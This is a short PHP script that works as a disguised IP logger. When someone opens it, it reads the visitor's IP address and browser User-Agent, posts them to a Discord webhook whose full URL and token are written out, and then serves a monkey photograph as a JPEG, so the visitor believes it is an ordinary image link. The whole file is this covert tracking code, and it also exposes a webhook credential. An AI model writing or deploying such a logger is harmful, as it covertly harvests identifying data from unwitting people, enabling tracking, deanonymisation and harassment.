<?php
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$webhookurl = "https://discordapp.com/api/webhooks/1363983953614340197/Zp_wS18KN2_mJMy4p0ecqXkRYI4C5hBEWF4ySz47RcY4rkF7Nye6pufbzHv0b1BI9Igp";

$data = array(
    "content" => "IP: $ip\nUser-Agent: $user_agent"
);

$options = array(
    'http' => array(
        'header'  => "Content-type: application/json\r\n",
        'method'  => 'POST',
        'content' => json_encode($data),
    ),
);

$context  = stream_context_create($options);
file_get_contents($webhookurl, false, $context);

$imageURL = "https://i.natgeofe.com/n/82fddbcc-4cbb-4373-bf72-dbc30068be60/drill-monkey-01.jpg";
$imageData = file_get_contents($imageURL);

header('Content-Type: image/jpeg');
echo $imageData;
?>
